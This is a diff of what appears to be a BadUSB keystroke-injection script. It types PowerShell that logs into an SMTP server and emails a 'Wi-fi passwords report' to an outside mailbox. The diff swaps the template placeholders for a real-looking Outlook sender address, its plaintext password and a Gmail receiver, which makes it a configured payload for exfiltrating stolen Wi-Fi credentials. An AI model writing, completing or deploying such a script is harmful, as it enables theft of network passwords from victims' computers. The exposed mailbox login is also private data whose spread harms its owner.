@@ -35,13 +35,13 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL-SENDER', 'PASSWORD')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('flappyasdfghjkl@outlook.com', 'simon.penguin')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'EMAIL-SENDER'
+STRING $ReportEmail.From = 'flappyasdfghjkl@outlook.com'
 ENTER
-STRING $ReportEmail.To.Add('EMAIL-RECEIVER')
+STRING $ReportEmail.To.Add('flappyasdfghjkl@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = "Wi-fi passwords report"
 ENTER
